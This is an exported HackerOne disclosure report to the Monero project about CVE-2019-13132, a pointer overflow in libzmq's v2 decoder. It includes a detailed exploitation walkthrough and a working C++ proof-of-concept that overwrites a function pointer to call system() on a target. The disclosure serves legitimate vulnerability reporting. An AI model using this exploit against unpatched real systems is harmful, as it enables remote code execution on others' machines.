{"id":652911,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NTI5MTE=","url":"https://hackerone.com/reports/652911","title":"CVE-2019-13132 - libzmq 4.1 series is vulnerable","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-07-22T08:00:22.223Z","submitted_at":"2019-07-22T08:00:22.223Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"evertonmelo","url":"/evertonmelo","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/297/601/ad3b433db0eced5113f6d2c7420e67426dea55dc_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7731,"url":"https://hackerone.com/monero","handle":"monero","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Monero","twitter_handle":"monero","website":"https://getmonero.org","about":" Monero: the secure, private, untraceable cryptocurrency"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-18T23:01:35.183Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-11-18T21:39:21.649Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nA pointer overflow, with code execution, was discovered in ZeroMQ libzmq (aka 0MQ) 4.2.x and 4.3.x before 4.3.1. A v2_decoder.cpp zmq::v2_decoder_t::size_ready integer overflow allows an authenticated attacker to overwrite an arbitrary amount of bytes beyond the bounds of a buffer, which can be leveraged to run arbitrary code on the target system. The memory layout allows the attacker to inject OS commands into a data structure located immediately after the problematic buffer (i.e., it is not necessary to use a typical buffer-overflow exploitation technique that changes the flow of control).  \n\n## Releases Affected:\n\nMonero \u003cv0.14.1.0 ( all version ). \n\n## Steps To Reproduce:\n\nIn src/v2_decoder.cpp zmq::v2_decoder_t::eight_byte_size_ready(), the attacker can provide an uint64_t of his choosing:\n\n 85 int zmq::v2_decoder_t::eight_byte_size_ready (unsigned char const *read_from_)\n 86 {\n 87     //  The payload size is encoded as 64-bit unsigned integer.\n 88     //  The most significant byte comes first.\n 89     const uint64_t msg_size = get_uint64 (_tmpbuf);\n 90 \n 91     return size_ready (msg_size, read_from_);\n 92 }\n\nThen, in src/v2_decoder.cpp zmq::v2_decoder_t::size_ready(), a comparison is performed to check if this peer-supplied msg_size_ is within the bounds of the currently allocated block of memory:\n\n117     if (unlikely (!_zero_copy\n118                   || ((unsigned char *) read_pos_ + msg_size_\n119                       \u003e (allocator.data () + allocator.size ())))) {\n\nThis is inadequate because a very large msg_size_ will overflow the pointer (read_pos_).\nIn other words, the comparison will compute as 'false' even though msg_size_ bytes don't fit in the currently allocated block.\nExploit details\n\nNow that msg_size_ has been set to a very high value, the attacker is allowed to send this amount of bytes, and libzmq will copy it to its internal buffer without any further checks.\n\nThis means that it's possible to write beyond the bounds of the allocated space.\n\nHowever, for the exploit this is not necessary to corrupt memory beyond the buffer proper.\n\nAs it turns out, the space the attacker is writing to is immediately followed by a struct content_t block:\n\n 67     struct content_t\n 68     {\n 69         void *data;\n 70         size_t size;\n 71         msg_free_fn *ffn;\n 72         void *hint;\n 73         zmq::atomic_counter_t refcnt;\n 74     };\n\nSo the memory layout is such that the receive buffer is immediately followed by data, then size, then ffn, then hint, then refcnt.\nNote that the receive buffer + the struct content_t is a single, solid block of memory; by overwriting beyond the designated receive buffer's bounds, no dlmalloc state variables in memory (like bk, fd) are corrupted (or, in other words, it wouldn't trigger AddressSanitizer).\n\nThis means that the attacker can overwrite all these members with arbitrary values.\n\nffn is a function pointer, that upon connection closure, is called with two parameters, data and hint.\n\nThis means the attacker can call an arbitrary function/address with two arbitrary parameters.\n\nIn my exploit, I set ffn to the address of strcpy, set the first parameter to somewhere in the executable's .data section, and the second parameter to the address of the character I want to write followed by a NULL character.\n\nSo for instance, if i want to write a 'g' character, I search the binary for an occurrence of 'g\\x00', and use this address as the second value to my strcpy call.\n\nFor each character of the command I want to execute on the remote machine, I make a separate request to write that character to the .data section.\nSo if I want to execute 'gnome-calculator', I first write a 'g', then a 'n', then an 'o', and so on, until the full 'gnome-calculator' string is written to .data.\n\nIn the next request, I overwrite the 'data' member of struct content_t with the address of the .data section (where now gnome-calculator resides), set the ffn member to the system libc function, and hint to NULL.\n\nIn effect, this calls system(\"gnome-calculator\"), by which this command is executed on the remote machine.\nExploit\n\nThe following is a self-exploit, that demonstrates the exploit flow as explained above.\n\n#include \u003cnetinet/in.h\u003e\n#include \u003carpa/inet.h\u003e\n#include \u003czmq.hpp\u003e\n#include \u003cstring\u003e\n#include \u003ciostream\u003e\n#include \u003cunistd.h\u003e\n#include \u003cthread\u003e\n#include \u003cmutex\u003e\n\nclass Thread {\n    public:\n    Thread() : the_thread(\u0026Thread::ThreadMain, this)\n    { }\n    ~Thread(){\n    }\n    private:\n    std::thread the_thread;\n    void ThreadMain() {\n        zmq::context_t context (1);\n        zmq::socket_t socket (context, ZMQ_REP);\n        socket.bind (\"tcp://*:6666\");\n\n        while (true) {\n            zmq::message_t request;\n\n            // Wait for next request from client\n            try {\n                socket.recv (\u0026request);\n            } catch ( ... ) { }\n        }\n    }\n};\n\nstatic void callRemoteFunction(const uint64_t arg1Addr, const uint64_t arg2Addr, const uint64_t funcAddr)\n{\n    int s;\n    struct sockaddr_in remote_addr = {};\n    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1)\n    {\n        abort();\n    }\n    remote_addr.sin_family = AF_INET;\n    remote_addr.sin_port = htons(6666);\n    inet_pton(AF_INET, \"127.0.0.1\", \u0026remote_addr.sin_addr);\n\n    if (connect(s, (struct sockaddr *)\u0026remote_addr, sizeof(struct sockaddr)) == -1)\n    {\n        abort();\n    }\n\n    const uint8_t greeting[] = {\n        0xFF, /* Indicates 'versioned' in zmq::stream_engine_t::receive_greeting */\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Unused */\n        0x01, /* Indicates 'versioned' in zmq::stream_engine_t::receive_greeting */\n        0x01, /* Selects ZMTP_2_0 in zmq::stream_engine_t::select_handshake_fun */\n        0x00, /* Unused */\n    };\n    send(s, greeting, sizeof(greeting), 0);\n\n    const uint8_t v2msg[] = {\n        0x02, /* v2_decoder_t::eight_byte_size_ready */\n        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* msg_size */\n    };\n    send(s, v2msg, sizeof(v2msg), 0);\n\n    /* Write UNTIL the location of zmq::msg_t::content_t */\n    size_t plsize = 8183;\n    uint8_t* pl = (uint8_t*)calloc(1, plsize);\n    send(s, pl, plsize, 0);\n    free(pl);\n\n    uint8_t content_t_replacement[] = {\n        /* void* data */\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n\n        /* size_t size */\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n\n        /* msg_free_fn *ffn */\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n\n        /* void* hint */\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    };\n\n    /* Assumes same endianness as target */\n    memcpy(content_t_replacement + 0, \u0026arg1Addr, sizeof(arg1Addr));\n    memcpy(content_t_replacement + 16, \u0026funcAddr, sizeof(funcAddr));\n    memcpy(content_t_replacement + 24, \u0026arg2Addr, sizeof(arg2Addr));\n\n    /* Overwrite zmq::msg_t::content_t */\n    send(s, content_t_replacement, sizeof(content_t_replacement), 0);\n\n    close(s);\n    sleep(1);\n}\n\nchar destbuffer[100];\nchar srcbuffer[100] = \"ping google.com\";\n\nint main(void)\n{\n    Thread* rt = new Thread();\n    sleep(1);\n\n    callRemoteFunction((uint64_t)destbuffer, (uint64_t)srcbuffer, (uint64_t)strcpy);\n\n    callRemoteFunction((uint64_t)destbuffer, 0, (uint64_t)system);\n\n    return 0;\n}\n\nNotes\n\nCrucial to this exploit is knowing certain addresses, like strcpy and system, though the address of strcpy could be replaced with any executable location that contains stosw / ret or anything else that moves [rsi] to [rdi], and system might be replaced with code that executes the string at rsi.\n\nI did not find any other vulnerabilities in libzmq, but if there is any information leaking vulnerability in libzmq, or the application that uses it, that would allow the attacker to calculate proper code offsets, this would defeat ASLR.\nResolution\n\nResolution of this vulnerability must consist of preventing pointer arithmetic overflow in src/v2_decoder.cpp zmq::v2_decoder_t::size_ready().\n## Supporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n## source code vulnerable: \nhttps://github.com/monero-project/monero/blob/master/contrib/depends/packages/zeromq.mk\n\n## fix:\nhttps://github.com/zeromq/libzmq/releases/tag/v4.3.1 \n\n# poc:\nhttps://github.com/zeromq/libzmq/issues/3351 \n\n## References:\n\nhttps://github.com/zeromq/libzmq/issues/3351\nhttps://github.com/zeromq/libzmq/releases/tag/v4.3.1\n    DEBIAN: https://www.debian.org/security/2019/dsa-4368\n    GENTOO:GLSA-201903-22 https://security.gentoo.org/glsa/201903-22\n\n## Impact\n\nA pointer overflow, with code execution, was discovered in ZeroMQ libzmq (aka 0MQ) 4.2.x and 4.3.x before 4.3.1.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eA pointer overflow, with code execution, was discovered in ZeroMQ libzmq (aka 0MQ) 4.2.x and 4.3.x before 4.3.1. A v2_decoder.cpp zmq::v2_decoder_t::size_ready integer overflow allows an authenticated attacker to overwrite an arbitrary amount of bytes beyond the bounds of a buffer, which can be leveraged to run arbitrary code on the target system. The memory layout allows the attacker to inject OS commands into a data structure located immediately after the problematic buffer (i.e., it is not necessary to use a typical buffer-overflow exploitation technique that changes the flow of control).  \u003c/p\u003e\n\n\u003ch2 id=\"releases-affected\"\u003eReleases Affected:\u003c/h2\u003e\n\n\u003cp\u003eMonero \u0026lt;v0.14.1.0 ( all version ). \u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eIn src/v2_decoder.cpp zmq::v2_decoder_t::eight_byte_size_ready(), the attacker can provide an uint64_t of his choosing:\u003c/p\u003e\n\n\u003cp\u003e85 int zmq::v2_decoder_t::eight_byte_size_ready (unsigned char const *read_from_)\u003cbr\u003e\n 86 {\u003cbr\u003e\n 87     //  The payload size is encoded as 64-bit unsigned integer.\u003cbr\u003e\n 88     //  The most significant byte comes first.\u003cbr\u003e\n 89     const uint64_t msg_size = get_uint64 (\u003cu\u003etmpbuf);\u003cbr\u003e\n 90 \u003cbr\u003e\n 91     return size_ready (msg_size, read_from\u003c/u\u003e);\u003cbr\u003e\n 92 }\u003c/p\u003e\n\n\u003cp\u003eThen, in src/v2_decoder.cpp zmq::v2_decoder_t::size_ready(), a comparison is performed to check if this peer-supplied msg_size_ is within the bounds of the currently allocated block of memory:\u003c/p\u003e\n\n\u003cp\u003e117     if (unlikely (!\u003cu\u003ezero_copy\u003cbr\u003e\n118                   || ((unsigned char *) read_pos\u003c/u\u003e + msg_size_\u003cbr\u003e\n119                       \u0026gt; (allocator.data () + allocator.size ())))) {\u003c/p\u003e\n\n\u003cp\u003eThis is inadequate because a very large msg_size_ will overflow the pointer (read_pos_).\u003cbr\u003e\nIn other words, the comparison will compute as \u0026#39;false\u0026#39; even though msg_size_ bytes don\u0026#39;t fit in the currently allocated block.\u003cbr\u003e\nExploit details\u003c/p\u003e\n\n\u003cp\u003eNow that msg_size_ has been set to a very high value, the attacker is allowed to send this amount of bytes, and libzmq will copy it to its internal buffer without any further checks.\u003c/p\u003e\n\n\u003cp\u003eThis means that it\u0026#39;s possible to write beyond the bounds of the allocated space.\u003c/p\u003e\n\n\u003cp\u003eHowever, for the exploit this is not necessary to corrupt memory beyond the buffer proper.\u003c/p\u003e\n\n\u003cp\u003eAs it turns out, the space the attacker is writing to is immediately followed by a struct content_t block:\u003c/p\u003e\n\n\u003cp\u003e67     struct content_t\u003cbr\u003e\n 68     {\u003cbr\u003e\n 69         void *data;\u003cbr\u003e\n 70         size_t size;\u003cbr\u003e\n 71         msg_free_fn *ffn;\u003cbr\u003e\n 72         void *hint;\u003cbr\u003e\n 73         zmq::atomic_counter_t refcnt;\u003cbr\u003e\n 74     };\u003c/p\u003e\n\n\u003cp\u003eSo the memory layout is such that the receive buffer is immediately followed by data, then size, then ffn, then hint, then refcnt.\u003cbr\u003e\nNote that the receive buffer + the struct content_t is a single, solid block of memory; by overwriting beyond the designated receive buffer\u0026#39;s bounds, no dlmalloc state variables in memory (like bk, fd) are corrupted (or, in other words, it wouldn\u0026#39;t trigger AddressSanitizer).\u003c/p\u003e\n\n\u003cp\u003eThis means that the attacker can overwrite all these members with arbitrary values.\u003c/p\u003e\n\n\u003cp\u003effn is a function pointer, that upon connection closure, is called with two parameters, data and hint.\u003c/p\u003e\n\n\u003cp\u003eThis means the attacker can call an arbitrary function/address with two arbitrary parameters.\u003c/p\u003e\n\n\u003cp\u003eIn my exploit, I set ffn to the address of strcpy, set the first parameter to somewhere in the executable\u0026#39;s .data section, and the second parameter to the address of the character I want to write followed by a NULL character.\u003c/p\u003e\n\n\u003cp\u003eSo for instance, if i want to write a \u0026#39;g\u0026#39; character, I search the binary for an occurrence of \u0026#39;g\\x00\u0026#39;, and use this address as the second value to my strcpy call.\u003c/p\u003e\n\n\u003cp\u003eFor each character of the command I want to execute on the remote machine, I make a separate request to write that character to the .data section.\u003cbr\u003e\nSo if I want to execute \u0026#39;gnome-calculator\u0026#39;, I first write a \u0026#39;g\u0026#39;, then a \u0026#39;n\u0026#39;, then an \u0026#39;o\u0026#39;, and so on, until the full \u0026#39;gnome-calculator\u0026#39; string is written to .data.\u003c/p\u003e\n\n\u003cp\u003eIn the next request, I overwrite the \u0026#39;data\u0026#39; member of struct content_t with the address of the .data section (where now gnome-calculator resides), set the ffn member to the system libc function, and hint to NULL.\u003c/p\u003e\n\n\u003cp\u003eIn effect, this calls system(\u0026quot;gnome-calculator\u0026quot;), by which this command is executed on the remote machine.\u003cbr\u003e\nExploit\u003c/p\u003e\n\n\u003cp\u003eThe following is a self-exploit, that demonstrates the exploit flow as explained above.\u003c/p\u003e\n\n\u003ch1 id=\"include-netinet-in-h\"\u003einclude \u0026lt;netinet/in.h\u0026gt;\u003c/h1\u003e\n\n\u003ch1 id=\"include-arpa-inet-h\"\u003einclude \u0026lt;arpa/inet.h\u0026gt;\u003c/h1\u003e\n\n\u003ch1 id=\"include-zmq-hpp\"\u003einclude \u0026lt;zmq.hpp\u0026gt;\u003c/h1\u003e\n\n\u003ch1 id=\"include-string\"\u003einclude \u0026lt;string\u0026gt;\u003c/h1\u003e\n\n\u003ch1 id=\"include-iostream\"\u003einclude \u0026lt;iostream\u0026gt;\u003c/h1\u003e\n\n\u003ch1 id=\"include-unistd-h\"\u003einclude \u0026lt;unistd.h\u0026gt;\u003c/h1\u003e\n\n\u003ch1 id=\"include-thread\"\u003einclude \u0026lt;thread\u0026gt;\u003c/h1\u003e\n\n\u003ch1 id=\"include-mutex\"\u003einclude \u0026lt;mutex\u0026gt;\u003c/h1\u003e\n\n\u003cp\u003eclass Thread {\u003cbr\u003e\n    public:\u003cbr\u003e\n    Thread() : the_thread(\u0026amp;Thread::ThreadMain, this)\u003cbr\u003e\n    { }\u003cbr\u003e\n    ~Thread(){\u003cbr\u003e\n    }\u003cbr\u003e\n    private:\u003cbr\u003e\n    std::thread the_thread;\u003cbr\u003e\n    void ThreadMain() {\u003cbr\u003e\n        zmq::context_t context (1);\u003cbr\u003e\n        zmq::socket_t socket (context, ZMQ_REP);\u003cbr\u003e\n        socket.bind (\u0026quot;tcp://*:6666\u0026quot;);\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    while (true) {\n        zmq::message_t request;\n\n        // Wait for next request from client\n        try {\n            socket.recv (\u0026amp;request);\n        } catch ( ... ) { }\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e};\u003c/p\u003e\n\n\u003cp\u003estatic void callRemoteFunction(const uint64_t arg1Addr, const uint64_t arg2Addr, const uint64_t funcAddr)\u003cbr\u003e\n{\u003cbr\u003e\n    int s;\u003cbr\u003e\n    struct sockaddr_in remote_addr = {};\u003cbr\u003e\n    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1)\u003cbr\u003e\n    {\u003cbr\u003e\n        abort();\u003cbr\u003e\n    }\u003cbr\u003e\n    remote_addr.sin_family = AF_INET;\u003cbr\u003e\n    remote_addr.sin_port = htons(6666);\u003cbr\u003e\n    inet_pton(AF_INET, \u0026quot;127.0.0.1\u0026quot;, \u0026amp;remote_addr.sin_addr);\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eif (connect(s, (struct sockaddr *)\u0026amp;remote_addr, sizeof(struct sockaddr)) == -1)\n{\n    abort();\n}\n\nconst uint8_t greeting[] = {\n    0xFF, /* Indicates \u0026#39;versioned\u0026#39; in zmq::stream_engine_t::receive_greeting */\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Unused */\n    0x01, /* Indicates \u0026#39;versioned\u0026#39; in zmq::stream_engine_t::receive_greeting */\n    0x01, /* Selects ZMTP_2_0 in zmq::stream_engine_t::select_handshake_fun */\n    0x00, /* Unused */\n};\nsend(s, greeting, sizeof(greeting), 0);\n\nconst uint8_t v2msg[] = {\n    0x02, /* v2_decoder_t::eight_byte_size_ready */\n    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* msg_size */\n};\nsend(s, v2msg, sizeof(v2msg), 0);\n\n/* Write UNTIL the location of zmq::msg_t::content_t */\nsize_t plsize = 8183;\nuint8_t* pl = (uint8_t*)calloc(1, plsize);\nsend(s, pl, plsize, 0);\nfree(pl);\n\nuint8_t content_t_replacement[] = {\n    /* void* data */\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n\n    /* size_t size */\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n\n    /* msg_free_fn *ffn */\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n\n    /* void* hint */\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n};\n\n/* Assumes same endianness as target */\nmemcpy(content_t_replacement + 0, \u0026amp;arg1Addr, sizeof(arg1Addr));\nmemcpy(content_t_replacement + 16, \u0026amp;funcAddr, sizeof(funcAddr));\nmemcpy(content_t_replacement + 24, \u0026amp;arg2Addr, sizeof(arg2Addr));\n\n/* Overwrite zmq::msg_t::content_t */\nsend(s, content_t_replacement, sizeof(content_t_replacement), 0);\n\nclose(s);\nsleep(1);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e}\u003c/p\u003e\n\n\u003cp\u003echar destbuffer[100];\u003cbr\u003e\nchar srcbuffer[100] = \u0026quot;ping google.com\u0026quot;;\u003c/p\u003e\n\n\u003cp\u003eint main(void)\u003cbr\u003e\n{\u003cbr\u003e\n    Thread* rt = new Thread();\u003cbr\u003e\n    sleep(1);\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecallRemoteFunction((uint64_t)destbuffer, (uint64_t)srcbuffer, (uint64_t)strcpy);\n\ncallRemoteFunction((uint64_t)destbuffer, 0, (uint64_t)system);\n\nreturn 0;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e}\u003c/p\u003e\n\n\u003cp\u003eNotes\u003c/p\u003e\n\n\u003cp\u003eCrucial to this exploit is knowing certain addresses, like strcpy and system, though the address of strcpy could be replaced with any executable location that contains stosw / ret or anything else that moves [rsi] to [rdi], and system might be replaced with code that executes the string at rsi.\u003c/p\u003e\n\n\u003cp\u003eI did not find any other vulnerabilities in libzmq, but if there is any information leaking vulnerability in libzmq, or the application that uses it, that would allow the attacker to calculate proper code offsets, this would defeat ASLR.\u003cbr\u003e\nResolution\u003c/p\u003e\n\n\u003cp\u003eResolution of this vulnerability must consist of preventing pointer arithmetic overflow in src/v2_decoder.cpp zmq::v2_decoder_t::size_ready().\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003e[list any additional material (e.g. screenshots, logs, etc.)]\u003c/p\u003e\n\n\u003ch2 id=\"source-code-vulnerable\"\u003esource code vulnerable:\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/monero-project/monero/blob/master/contrib/depends/packages/zeromq.mk\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmonero-project%2Fmonero%2Fblob%2Fmaster%2Fcontrib%2Fdepends%2Fpackages%2Fzeromq.mk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/monero-project/monero/blob/master/contrib/depends/packages/zeromq.mk\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"fix\"\u003efix:\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/zeromq/libzmq/releases/tag/v4.3.1\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fzeromq%2Flibzmq%2Freleases%2Ftag%2Fv4.3.1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/zeromq/libzmq/releases/tag/v4.3.1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003epoc:\u003c/h1\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/zeromq/libzmq/issues/3351\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fzeromq%2Flibzmq%2Fissues%2F3351\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/zeromq/libzmq/issues/3351\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/p\u003e\n\n\u003ch2 id=\"references\"\u003eReferences:\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/zeromq/libzmq/issues/3351\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fzeromq%2Flibzmq%2Fissues%2F3351\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/zeromq/libzmq/issues/3351\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://github.com/zeromq/libzmq/releases/tag/v4.3.1\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fzeromq%2Flibzmq%2Freleases%2Ftag%2Fv4.3.1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/zeromq/libzmq/releases/tag/v4.3.1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n    DEBIAN: \u003ca title=\"https://www.debian.org/security/2019/dsa-4368\" href=\"/redirect?url=https%3A%2F%2Fwww.debian.org%2Fsecurity%2F2019%2Fdsa-4368\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.debian.org/security/2019/dsa-4368\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n    GENTOO:GLSA-201903-22 \u003ca title=\"https://security.gentoo.org/glsa/201903-22\" href=\"/redirect?url=https%3A%2F%2Fsecurity.gentoo.org%2Fglsa%2F201903-22\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://security.gentoo.org/glsa/201903-22\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eA pointer overflow, with code execution, was discovered in ZeroMQ libzmq (aka 0MQ) 4.2.x and 4.3.x before 4.3.1.\u003c/p\u003e\n","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-12-18T21:39:21.732Z","allow_singular_disclosure_after":-32518474.761998866,"singular_disclosure_allowed":true,"vote_count":2,"voters":["who-biz","razordefcon"],"severity":{"rating":"medium","score":6.8,"author_type":"User","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"unchanged","confidentiality":"high","integrity":"low","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5390780,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @evertonmelo, thank you very much for the report.\n\nRegarding monero, this appears to have only been introduced after gitian support was merged. For years prior, anyone using system-provided libzmq would have had the latest version available at that time.\n\nWe'll make the appropriate changes. Please paste an XMR address if you wish to receive bounty.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/evertonmelo\"\u003e@evertonmelo\u003c/a\u003e, thank you very much for the report.\u003c/p\u003e\n\n\u003cp\u003eRegarding monero, this appears to have only been introduced after gitian support was merged. For years prior, anyone using system-provided libzmq would have had the latest version available at that time.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ll make the appropriate changes. Please paste an XMR address if you wish to receive bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-22T20:09:10.081Z","updated_at":"2019-07-22T20:09:10.081Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5391878,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I am very happy that my report was useful. @anonimal follow my address XMR: 49XyENoEWZhaVtfaA9SArHWkqnXBEG2agY6gZMV6RYbjKBEcaYVZUbKiuKqMJER4p25CMx4PbiN6deDrmGbRkKCD7kbqWtW ","markdown_message":"\u003cp\u003eI am very happy that my report was useful. \u003ca href=\"/anonimal\"\u003e@anonimal\u003c/a\u003e follow my address XMR: 49XyENoEWZhaVtfaA9SArHWkqnXBEG2agY6gZMV6RYbjKBEcaYVZUbKiuKqMJER4p25CMx4PbiN6deDrmGbRkKCD7kbqWtW \u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-22T22:14:12.039Z","updated_at":"2019-07-22T22:14:12.039Z","actor":{"username":"evertonmelo","cleared":false,"url":"/evertonmelo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/297/601/ad3b433db0eced5113f6d2c7420e67426dea55dc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":535352,"filename":"myxmr.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/535/352/5acf03ad1009a6ffbbd53be9f9d74e77f7dd683f/myxmr.png?response-content-disposition=attachment%3B%20filename%3D%22myxmr.png%22%3B%20filename%2A%3DUTF-8%27%27myxmr.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063356Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLB